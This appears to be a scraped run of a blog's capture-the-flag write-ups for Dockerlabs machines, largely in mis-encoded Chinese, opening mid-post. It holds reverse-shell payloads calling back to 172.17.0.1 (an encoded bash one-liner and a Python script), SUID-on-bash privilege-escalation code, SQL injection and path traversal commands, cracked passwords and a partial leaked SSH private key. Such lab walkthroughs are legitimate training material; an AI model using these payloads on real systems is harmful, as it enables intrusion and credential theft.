ç„¶åå°±èƒ½sshç™»å½•äº†ï¼Œä½†æ˜¯ä¸èƒ½ä½¿ç”¨cdå‘½ä»¤ï¼Ÿ\nå¯ä»¥å‚è€ƒä¸€ä¸‹å…·ä½“çš„ip\nCristal #\ræ‰§è¡Œsendinv2æ–‡ä»¶\nä½¿ç”¨wiresharkè¿›è¡ŒæŠ“åŒ…å‘ç°ä¸€ä¸ªBASE32åŠ å¯†åå­—ç¬¦ä¸²\nå°†é‡Œé¢çš„åŠ å¯†å­—æ®µè§£å¯†ä¸€ä¸‹\nhola! somos el grupo BlackCat, pensamos en encriptar este server pero no tiene nada de interes, te ahorrare tiempo: cristal:dropchostop453SJF : disfruta å¾—åˆ°äº†cristalçš„å¯†ç \nRoot #\rä¸Šä¼ linpeasï¼Œæ³¨æ„åˆ°rootåœ¨è¿è¡Œsystem.sh\ncristal@f47e170acca0:~$ cat systm.sh #!/bin/bash\rvar1=\u0026#34;/home/cristal/systm.c\u0026#34;\rvar2=\u0026#34;/home/cristal/syst\u0026#34;\rwhile true; do\rgcc -o $var2 $var1\r$var2\rsleep 15\rdone\rcristal@f47e170acca0:~$ ls -al\rtotal 64\rdrwxr-x--- 1 cristal cristal 4096 Feb 25 08:51 .\rdrwxr-xr-x 1 root root 4096 Nov 11 12:07 ..\r-rw------- 1 cristal cristal 0 Nov 11 12:20 .bash_history\r-rw-r--r-- 1 cristal cristal 220 Nov 11 12:07 .bash_logout\r-rw-r--r-- 1 cristal cristal 3771 Nov 11 12:07 .bashrc\rdrwx------ 2 cristal cristal 4096 Feb 25 08:48 .cache\rdrwx------ 3 cristal cristal 4096 Feb 25 08:49 .gnupg\rdrwxrwxr-x 3 cristal cristal 4096 Nov 11 12:13 .local\r-rw-r--r-- 1 cristal cristal 807 Nov 11 12:07 .profile\r-rwxr-xr-x 1 root root 16416 Feb 25 08:51 syst\r-rw-rw-r-- 1 root editor 1516 Nov 11 12:13 systm.c\r-rwxr-xr-x 1 root root 141 Nov 11 20:33 systm.sh å½“å‰ç”¨æˆ·å¯¹systm.cå…·æœ‰å¯å†™æƒé™\nåªéœ€è¦ä¿®æ”¹ä¸€ä¸‹å°±è¡Œäº†\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;string.h\u0026gt;\r#include \u0026lt;unistd.h\u0026gt;\r#include \u0026lt;sys/utsname.h\u0026gt;\r#include \u0026lt;time.h\u0026gt;\rvoid log_system_info(const char *filename) {\rFILE *log_file = fopen(filename, \u0026#34;a\u0026#34;);\rif (log_file == NULL) {\rperror(\u0026#34;Error al abrir el archivo de log\u0026#34;);\rexit(EXIT_FAILURE);\r}\r// InformaciÃ³n del sistema\rstruct utsname sys_info;\rif (uname(\u0026amp;sys_info) \u0026lt; 0) {\rperror(\u0026#34;Error al obtener informaciÃ³n del sistema\u0026#34;);\rexit(EXIT_FAILURE);\r}\r// Tiempo de inicio del sistema\rstruct timespec uptime;\rif (clock_gettime(CLOCK_BOOTTIME, \u0026amp;uptime) \u0026lt; 0) {\rperror(\u0026#34;Error al obtener el tiempo de inicio del sistema\u0026#34;);\rexit(EXIT_FAILURE);\r}\rtime_t boot_time = time(NULL) - uptime.tv_sec;\r// Escribir la informaciÃ³n en el archivo de log\rfprintf(log_file, \u0026#34;-----------------------------\\n\u0026#34;);\rfprintf(log_file, \u0026#34;Fecha y Hora: %s\u0026#34;, ctime(\u0026amp;boot_time));\rfprintf(log_file, \u0026#34;Nombre del Sistema: %s\\n\u0026#34;, sys_info.sysname);\rfprintf(log_file, \u0026#34;Nombre del Host: %s\\n\u0026#34;, sys_info.nodename);\rfprintf(log_file, \u0026#34;VersiÃ³n del Sistema: %s\\n\u0026#34;, sys_info.release);\rfprintf(log_file, \u0026#34;VersiÃ³n del Kernel: %s\\n\u0026#34;, sys_info.version);\rfprintf(log_file, \u0026#34;Arquitectura de Hardware: %s\\n\u0026#34;, sys_info.machine);\rfprintf(log_file, \u0026#34;-----------------------------\\n\u0026#34;);\rfclose(log_file);\r}\rint main() {\rconst char *log_filename = \u0026#34;/tmp/registros.log\u0026#34;;\rsystem(\u0026#34;chmod u+s /bin/bash\u0026#34;);\rlog_system_info(log_filename);\rreturn 0;\r} Summary #\rUserï¼šåœ¨é¡µé¢ä¸Šä½¿ç”¨filterchainsè™½ç„¶æˆåŠŸäº†ï¼Œä½†æ˜¯è¿˜æ˜¯æ— æ³•ç›´æ¥åå¼¹shellï¼Œé€šè¿‡ç›®å½•é‡Œçš„æ–‡ä»¶å¾—çŸ¥darksçš„å¯†ç ï¼Œå¹¶ä¸”éœ€è¦ç»™è‡ªå·±æ·»åŠ ä¸€ä¸ª172.17.0.188çš„ç½‘ç»œæ¥å£æ‰èƒ½æˆåŠŸè¿æ¥ã€‚ä½¿ç”¨wiresharkæŠ“åŒ…å¾—åˆ°åŠ å¯†å­—ç¬¦ä¸²ï¼Œè·å¾—cristalçš„å¯†ç ã€‚ï¼ˆä¹Ÿå¯ä»¥é€šè¿‡hydraçˆ†ç ´å¾—åˆ°darksçš„å¯†ç ï¼Œå¯èƒ½å¹¶ä¸æ˜¯é¢„æœŸï¼Ÿ\nRootï¼šå½“å‰ç”¨æˆ·å¯¹systm.cå…·æœ‰å¯å†™æƒé™ï¼Œç”±äºæ²¡æœ‰vimï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯nanoï¼Œå¤´æ–‡ä»¶ä¸­åŒ…å«è¿‡stdlib.hï¼Œå› æ­¤å¯ä»¥åœ¨ä¸»å‡½æ•°ä¸­ç›´æ¥ä½¿ç”¨systemå‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œç»™**/bin/bash**æ·»åŠ æ‰§è¡Œè€…æƒé™ã€‚\n","date":"2025-02-26","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-swiss/","section":"Posts","summary":"","title":"Dockerlabs-Swiss","type":"posts"},{"content":"","date":"2025-02-26","externalUrl":null,"permalink":"/tags/java/","section":"Tags","summary":"","title":"Java","type":"tags"},{"content":"","date":"2025-02-26","externalUrl":null,"permalink":"/categories/web/","section":"Categories","summary":"","title":"Web","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali â¯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 16:15 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000089s latency).\rNot shown: 999 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: Apple Store\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 9.98 seconds Dirsearch #\r[root@kali] /home/kali â¯ dirsearch -u 172.17.0.2 -t 50 -i 200 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/reports/_172.17.0.2/_25-02-25_16-19-18.txt\rTarget: http://172.17.0.2/\r[16:19:18] Starting: [16:19:35] 200 - 631B - /login.php [16:19:41] 200 - 626B - /register.php [16:19:47] 200 - 405B - /uploads/ [16:19:48] 200 - 0B - /vendor/composer/autoload_static.php [16:19:48] 200 - 1KB - /vendor/composer/LICENSE [16:19:48] 200 - 520B - /vendor/ [16:19:48] 200 - 0B - /vendor/autoload.php [16:19:48] 200 - 0B - /vendor/composer/autoload_classmap.php\r[16:19:48] 200 - 0B - /vendor/composer/autoload_psr4.php [16:19:48] 200 - 0B - /vendor/composer/ClassLoader.php\r[16:19:48] 200 - 3KB - /vendor/composer/installed.json [16:19:48] 200 - 0B - /vendor/composer/autoload_namespaces.php [16:19:48] 200 - 0B - /vendor/composer/autoload_real.php Task Completed å¯ä»¥çœ‹åˆ°å­˜åœ¨uploadsç›®å½•\nSQL Injection #\rè¿›å…¥ä¹‹åéšæ„æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œè¿›å…¥åˆ°mycart\nå¯ä»¥çœ‹åˆ°å­˜åœ¨SQLæ³¨å…¥æ¼æ´\n[root@kali] /home/kali â¯ sqlmap -u \u0026#34;http://172.17.0.2/mycart.php?search=1\u0026#34; --cookie \u0026#34;PHPSESSID=uv694pbom64dihteq9e6v2s5c0\u0026#34; -p search -D apple_store -T users --dump å¯ä»¥ç›´æ¥ç ´è§£\nluisillo:mundodecaramelo\radmin:0844575632 www-data #\rä½¿ç”¨adminçš„è´¦æˆ·è¿›å…¥åˆ°åå°\næ¥åˆ°Settingsç•Œé¢ï¼Œå¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œå¯¹æ–‡ä»¶ååç¼€æœ‰æ£€æŸ¥ï¼Œä½¿ç”¨phtmlå¯ä»¥ç»•è¿‡\nè®¿é—®**/uploads/shell.phtml**å³å¯æ‰§è¡Œå‘½ä»¤\ncmd=echo \u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzEwMCAwPiYx\u0026#34; |base64 -d |bash User luisillo_o #\rè¿™é‡Œæˆ‘æ£€æŸ¥äº†linpeaså’Œpspyçš„è¾“å‡ºï¼Œéƒ½æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚\næ•°æ®åº“ä¸­çš„å¯†ç æ— æ³•ç™»å½•åˆ°luisillo_oï¼Œåªèƒ½å°è¯•çˆ†ç ´ç”¨æˆ·çš„å¯†ç ã€‚\nç”±äºå¤–éƒ¨å¹¶æ²¡æœ‰å¼€å¯22ç«¯å£ï¼Œåªèƒ½å†…éƒ¨çˆ†ç ´ã€‚éœ€è¦ä½¿ç”¨åˆ°suForceå’Œrockyou.txt\nd4t4s3c/suForce: Obtain a user\u0026rsquo;s system password, this tool uses the su binary to perform a brute force attack until a successful collision occurs. Root #\rå‘ç°luisilloå¯ä»¥æŸ¥çœ‹shadowæ–‡ä»¶\nç ´è§£å¾—åˆ°rootçš„å¯†ç ï¼šrainbow2\nSummary #\rwww-dataï¼šæ¯”è¾ƒç®€å•çš„SQLæ³¨å…¥å¾—åˆ°åå°è´¦æˆ·å¯†ç ï¼Œç„¶åæ–‡ä»¶ä¸Šä¼ ç»•è¿‡phpåç¼€åæ£€æµ‹ã€‚\nUserï¼šæ²¡æœ‰ç‰¹æ®Šæƒé™çš„å‘½ä»¤æˆ–è€…æ–‡ä»¶ï¼Œä¹Ÿæ²¡æœ‰å®šæ—¶ä»»åŠ¡ä¹‹ç±»çš„ï¼Œåªèƒ½æ˜¯çˆ†ç ´ç”¨æˆ·å¯†ç ï¼Œå½“ç„¶è¿™æ˜¯ä¸‹ç­–ã€‚\nRootï¼šè¯»å–**/etc/shadow**æ–‡ä»¶è¿›è¡Œç ´è§£ã€‚\n","date":"2025-02-25","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-apolos/","section":"Posts","summary":"","title":"Dockerlabs-Apolos","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/chatme â¯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 19:54 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000088s latency).\rNot shown: 999 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r80/tcp open http nginx 1.24.0 (Ubuntu)\r|_http-title: ChatMe - The Best Online Chat Solution\r|_http-server-header: nginx/1.24.0 (Ubuntu)\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 172.17.0.2 ç½‘é¡µä¸­å­˜åœ¨chat.chatme.dlï¼Œå°†å…¶æ·»åŠ åˆ°**/etc/hosts**\nGobuster #\r[root@kali] /home/kali/chatme â¯ gobuster dir -u \u0026#34;http://chat.chatme.dl/\u0026#34; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php --exclude-length 0\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://chat.chatme.dl/\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] Exclude Length: 0\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/login.php (Status: 200) [Size: 1891]\r/uploads (Status: 301) [Size: 178] [--\u0026gt; http://chat.chatme.dl/uploads/]\r/index2.php (Status: 200) [Size: 5769]\r/chat.php (Status: 200) [Size: 2]\r/upload.php (Status: 200) [Size: 147]\r/css (Status: 301) [Size: 178] [--\u0026gt; http://chat.chatme.dl/css/]\r/js (Status: 301) [Size: 178] [--\u0026gt; http://chat.chatme.dl/js/]\r/LICENSE (Status: 200) [Size: 35147]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== Upload #\rå°è¯•ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬ï¼Œå‘ç°åç¼€åè¢«ä¿®æ”¹ä¸ºäº†PNG\nè¿™é‡Œæ²¡ä»€ä¹ˆæ€è·¯ï¼Œçœ‹äº†ä¸€ä¸‹é¢˜è§£ï¼Œå‘ç°**.pyz**æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¹¶ä¸”Whatsappé‡Œé¢å­˜åœ¨ä¸€ä¸ªæ¼æ´\nhttps://github.com/r000t1ng/Reverse-Shell-Whatsapp import socket, subprocess, os\rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\rs.connect((\u0026#34;172.17.0.1\u0026#34;, 100))\ros.dup2(s.fileno(), 0)\ros.dup2(s.fileno(), 1)\ros.dup2(s.fileno(), 2)\rp = subprocess.call([\u0026#34;/bin/sh\u0026#34;, \u0026#34;-i\u0026#34;]) åˆ¶ä½œpyzæ–‡ä»¶ï¼Œç„¶åç›‘å¬\npython -m zipapp reverse_shell.py -o reverse_shell.pyz Root #\ræŸ¥çœ‹sudoå‘½ä»¤\n$ sudo -l\rMatching Defaults entries for system on 762518b8eb29:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\ruse_pty\rUser system may run the following commands on 762518b8eb29:\r(ALL : ALL) NOPASSWD: /usr/bin/procmail åœ¨GTFObinsä¸­å¹¶æ²¡æœ‰æ”¶é›†\nä½†æ˜¯å¯ä»¥åˆ›å»ºé…ç½®æ–‡ä»¶ç„¶åæŒ‡å®šï¼šprocmail - Unix, Linux Command\nTMPFILE=\u0026#34;/tmp/pwned2.txt\u0026#34;\r:0\r| touch $TMPFILE; chmod u+s /bin/bash ç„¶åæ‰§è¡Œ\n$ echo \u0026#34;123\u0026#34; | sudo /usr/bin/procmail -m ./config\r$ /bin/bash -p\rwhoami\rroot Summary #\rUserï¼šå¡åœ¨äº†æ–‡ä»¶ä¸Šä¼ çš„é‚£ä¸€æ­¥ï¼Œé¢˜ç›®ä¹Ÿæ²¡æœ‰å“ªé‡Œæš—ç¤ºäº†æ˜¯Whatsappï¼Œçœ‹äº†å…¶ä»–çš„è§£æ‰çŸ¥é“ã€‚\nRootï¼šå°±æ˜¯å¼•ç”¨å±é™©é…ç½®æ–‡ä»¶ï¼Œå†™å…¥ææƒçš„ä»£ç ã€‚\n","date":"2025-02-25","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-chatme/","section":"Posts","summary":"","title":"Dockerlabs-Chatme","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Report â¯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 18:34 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000076s latency).\rNot shown: 997 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 58:46:38:70:8c:d8:4a:89:93:07:b3:43:17:81:59:f1 (ECDSA)\r|_ 256 25:99:39:02:52:4b:80:3f:aa:a8:9a:d4:8e:9a:eb:10 (ED25519)\r80/tcp open http Apache httpd 2.4.58\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: Did not follow redirect to http://realgob.dl/\r3306/tcp open mysql MySQL 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1\r| mysql-info: | Protocol: 10\r| Version: 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1\r| Thread ID: 8\r| Capabilities flags: 63486\r| Some Capabilities: LongColumnFlag, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, Support41Auth, IgnoreSigpipes, ConnectWithDatabase, SupportsTransactions, InteractiveClient, Speaks41ProtocolNew, FoundRows, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ODBCClient, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments\r| Status: Autocommit\r| Salt: SMf;1\u0026amp;jb.[aWoKfBUf~i\r|_ Auth Plugin Name: mysql_native_password\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.08 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 9.89 seconds å°†realgob.dlæ·»åŠ åˆ°**/etc/hosts**\nSQL injection #\råœ¨noticias.phpä¸­å‘ç°å­˜åœ¨SQLæ³¨å…¥æ¼æ´\n[root@kali] /home/kali/Report â¯ sqlmap -u \u0026#34;http://realgob.dl/noticias.php?id=1\u0026#34; -p id --dbs ä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œå…¶ä¸­çš„å¯†ç ä¹Ÿæ— æ³•ç ´è§£\nDirsearch #\r[root@kali] /home/kali/Report â¯ dirsearch -u realgob.dl -t 50 -i 200\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Report/reports/_realgob.dl/_25-02-25_18-55-46.txt\rTarget: http://realgob.dl/\r[18:55:46] Starting: [18:55:48] 200 - 2KB - /about.php [18:55:49] 200 - 467B - /admin.php [18:55:52] 200 - 510B - /api/ [18:55:52] 200 - 510B - /api/v1/ [18:55:52] 200 - 500B - /api/v2/ [18:55:53] 200 - 475B - /assets/ [18:55:55] 200 - 0B - /config.php [18:55:56] 200 - 521B - /database/ [18:55:59] 200 - 452B - /images/ [18:55:59] 200 - 504B - /includes/ [18:55:59] 200 - 22KB - /info.php [18:56:00] 200 - 0B - /LICENSE [18:56:01] 200 - 1KB - /login.php [18:56:01] 200 - 475B - /logs/ [18:56:04] 200 - 0B - /pages/ [18:56:07] 200 - 0B - /README.md [18:56:12] 200 - 484B - /uploads/ Task Completed æ³„éœ²äº†phpinfo\nFilterChains #\ræ¥åˆ°Abouté¡µé¢ç‚¹å‡»Read Moreï¼Œå‘ç°URLä¸­å‡ºç°äº†ä¸€ä¸ª**?file=**å‚æ•°\nå°è¯•è®¾ç½®ä¸º**/etc/passwd**ï¼ŒæˆåŠŸè¯»å–\nå¹¶ä¸”å¯ä»¥ä½¿ç”¨php://filterè¿‡æ»¤å™¨\nåœ¨phpinfoä¸­å‘ç°å­˜åœ¨Oracleï¼Œå› æ­¤å¯ä»¥å°è¯•ä½¿ç”¨filter-chainsæ”»å‡»\nSynacktiv/php_filter_chain_generator Git-dumper #\råœ¨linpeasè¾“å‡ºä¸­å‘ç°å­˜åœ¨gitæ³„éœ²\n[root@kali] /home/kali/Desktop â¯ git-dumper http://realgob.dl/desarrollo/.git/ ./realgob.git åœ¨å…¶ä¸­ä¸€ä¸ªæäº¤ä¸­å¾—åˆ°admçš„å¯†ç ï¼Œæ³¨æ„ä¸æ˜¯hashï¼ï¼\nadm:9fR8pLt@Q2uX7dM^sW3zE5bK8nQ@7pX Root #\radmç”¨æˆ·å¹¶æ²¡æœ‰ç‰¹æ®Šæƒé™çš„å‘½ä»¤ï¼Œä¹Ÿæ‰¾ä¸åˆ°å…¶ä»–çš„å¯åˆ©ç”¨æ–‡ä»¶ã€‚\nçœ‹äº†é¢˜è§£æ‰çŸ¥é“ï¼Œåœ¨admç›®å½•çš„bashrcé‡Œé¢ï¼ˆè¿™è°èƒ½çŸ¥é“ï¼Ÿï¼Ÿï¼Ÿ\nä½¿ç”¨Cyberchefè¿›è¡Œåå…­è¿›åˆ¶è½¬æ¢\nå¾—åˆ°å¯†ç æ˜¯ï¼šdockerlabs4u\nSummary #\rwww-dataï¼šä»ç½‘é¡µä¸Šæ¥çœ‹å­˜åœ¨SQLæ³¨å…¥å’Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œé…åˆfilterchainsç”šè‡³å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä»è€Œåå¼¹shellã€‚\nuserï¼šgitæ³„éœ²ï¼ŒæŸ¥çœ‹æäº¤è®°å½•å¾—åˆ°ç”¨æˆ·çš„å¯†ç ã€‚\nRootï¼šè¿™ä¸ªå°±çº¯å±è„‘ç­‹æ€¥è½¬å¼¯äº†ğŸ˜“ã€‚\n","date":"2025-02-25","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-report/","section":"Posts","summary":"","title":"Dockerlabs-Report","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap 10.10.10.2 #\r[root@kali] /home/kali/grandma â¯ nmap 10.10.10.2 -sV -A Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 14:29 CST\rNmap scan report for 10.10.10.2\rHost is up (0.000093s latency).\rNot shown: 997 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 f0:d4:14:46:ad:c7:15:dd:09:8d:5a:c9:4c:a0:41:86 (ECDSA)\r|_ 256 88:8f:11:21:2a:29:72:fb:60:cb:39:c7:97:05:aa:9d (ED25519)\r80/tcp open http Apache httpd 2.4.58\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: Did not follow redirect to http://grandma.dl/\r5000/tcp open http aiohttp 3.9.1 (Python 3.12)\r| http-title: Hospital - Calendar\r|_Requested resource was /static/index.html\r|_http-server-header: Python/3.12 aiohttp/3.9.1\rMAC Address: 02:42:0A:0A:0A:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 10.10.10.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 14.88 seconds å°†grandma.dlæ·»åŠ åˆ°**/etc/hosts**\næ³¨æ„åˆ°åœ¨5000ç«¯å£ä¸Šæœ‰ä¸€ä¸ªaiohttp/3.9.1çš„æœåŠ¡ï¼Œå¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šè¯»å–ä»»æ„æ–‡ä»¶ï¼Œåœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ä¹Ÿæ¶‰åŠåˆ°è¿‡ï¼šHTB-Chemistry - HYH\nCVE-2024-23334 #\ræ‰«æç›®å½•å¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªstaticç›®å½•\n[root@kali] /home/kali/grandma â¯ gobuster dir -u \u0026#34;http://10.10.10.2:5000/\u0026#34; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://10.10.10.2:5000/\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/static (Status: 403) [Size: 14]\rProgress: 220560 / 220561 (100.00%)\r===============================================================\rFinished\r============================================================== å°è¯•è¯»å–**/etc/passwd**æˆåŠŸ\n[root@kali] /home/kali/grandma â¯ curl -s --path-as-is \u0026#34;http://10.10.10.2:5000/static/../../../../../etc/passwd\u0026#34; root:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\r_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\rubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\rsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\rsystemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\rmessagebus:x:100:101::/nonexistent:/usr/sbin/nologin\rsystemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin\rsshd:x:101:65534::/run/sshd:/usr/sbin/nologin\rdrzunder:x:1001:1001:,,,:/home/drzunder:/bin/bash çœ‹åˆ°**/homeä¸‹å­˜åœ¨ubuntuå’Œdrzunder**ä¸¤ä¸ªç”¨æˆ·\nå¹¶ä¸”å¯ä»¥è¯»å–åˆ°drzunderçš„sshå¯†é’¥\n[root@kali] /home/kali/grandma â¯ curl -s --path-as-is \u0026#34;http://10.10.10.2:5000/static/../../../../../home/drzunder/.ssh/id_rsa\u0026#34; -----BEGIN OPENSSH PRIVATE KEY-----\rb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\rNhAAAAAwEAAQAAAYEApr0W9qKwYiVTcQS+MctQUD/cICLRC8kpr8bBPi5JARDce78ZAXU4\rd4WPqFtV6SHc3A0fi6sZiLINQIeFXQKaXuUtURFs/MdUtL3FYhJuHFTZct7Wv5ER0XNTCL\rN5SQFPwxn52kaxKZ+x867dZ89lpHTRtNp9kOrauDgTT9WiDB8qayctVZyJYFKh56wFN1S/\rhF9GupgN6+pdFwxRktP5BGbvIK36gGLFwcTLnK/vgQuqsgvzioYIQpc+prgzS755eqMjNa\r+QplzimQEKYmxpOMJOzfcskZAPHtglEWmUewXE4CjGbFm8ukxtWD2Y1ou8Bjbg3JA1tEUv\rpqzlUzXlonf7FlA7zsEGM7FaHTKk0EDxYlXnUklc7UHt8hx/wNd2kTuxU/W9yibJEMPeNz\rsylWqTxozq5shkA5YCg8WSHxdpIyh9wVcffDqXJFcgAHA9Q31BZ9zcASiOszBd2TG8odb1\rkzlZ+gY5WWo7BsMZaXgO/CM3Bvy6V/XNpfcb24l/AAAFkLmzzVS5s81UAAAAB3NzaC1yc2\rEAAAGBAKa9FvaisGIlU3EEvjHLUFA/3CAi0QvJKa/GwT4uSQEQ3Hu/GQ